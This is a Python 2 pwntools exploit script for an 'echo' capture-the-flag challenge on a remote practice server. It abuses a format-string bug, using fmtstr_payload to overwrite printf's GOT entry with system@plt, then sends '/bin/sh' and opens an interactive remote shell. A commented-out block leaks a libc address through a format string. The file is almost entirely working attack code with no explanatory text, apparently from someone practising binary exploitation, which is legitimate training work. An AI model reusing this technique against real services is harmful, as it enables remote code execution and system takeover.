from pwn import *

def debug(addr = '0x080485B8'):
    raw_input('debug:')
    gdb.attach(r, "b *" + addr)

#objdump -dj .plt test
context(arch='i386', os='linux', log_level='debug')

#r = process('/home/h11p/hackme/echo')

r = remote('hackme.inndy.tw', 7711)

elf = ELF('/home/h11p/hackme/echo')

printf_got_addr = elf.got['printf']
print "%x" % printf_got_addr
system_plt_addr = elf.plt['system']
print "%x" % system_plt_addr


'''
print hex(printf_got_addr)
print hex(system_got_addr)
#printf_got_addr = 0x804a010
#system_got_addr = 0x804a018
leak_payload = "b%9$saaa" + p32(system_got_addr)#leak target func addr
r.sendline(leak_payload)
r.recvuntil('b')
info = r.recvuntil("aaa")[:-3]
print info.encode('hex')
system_addr = u32(info[:4])

print hex(system_addr)
'''


payload = fmtstr_payload(7, {printf_got_addr: system_plt_addr})
print payload                          #\x10\xa0\x0\x11\xa0\x0\x12\xa0\x0\x13\xa0\x0%240c%7$hhn%132c%8$hhn%128c%9$hhn%4c%10$hhn
#payload="aaa"
#payload=p32(printf_got_addr)+"a"*4*6+p32(system_got_addr)+"%7$n"
#print payload
#debug()
r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()
